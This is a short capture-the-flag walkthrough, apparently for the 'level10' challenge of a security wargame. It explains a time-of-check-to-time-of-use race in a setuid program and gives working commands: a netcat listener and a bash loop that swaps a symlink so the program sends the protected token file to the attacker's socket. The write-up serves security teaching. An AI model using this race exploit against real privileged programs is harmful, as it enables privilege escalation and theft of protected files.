``` shell
ls -la
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

`level10` does following:
1. Checks access rights on the given file;
2. If given file is not readable and writable, exits;
3. Connect to TCP socket with given adress and port 6969;
4. Read the file;
5. Write the file to socket.

There is a exloit called TOCTOU.
The idea behind it is that between `access` call and `open` call a file may change.

We will need 3 terminals:

In the first we will run the program:
``` shell
./level10 /var/tmp/level10_link [IP of your VM]
```

In the second we will open the socket:
``` shell
nc -l 6969
```

In the third we will do actual exploit with following script:
``` shell
#!/bin/bash
rm -f /var/tmp/level10_dummy.txt
touch /var/tmp/level10_dummy.txt

while true
do
ln -fs /var/tmp/level10_dummy.txt /var/tmp/level10_link
ln -fs /home/user/level10/token /var/tmp/level10_link
done
```

This script periodically changes target of link `level10_link`.
If we run the program multiple times, one time we will perform the desired exploit.

**Resources**
https://nanxiao.gitbooks.io/openbsd-netcat-demystified/content/
https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
https://defcon.ru/os-security/888/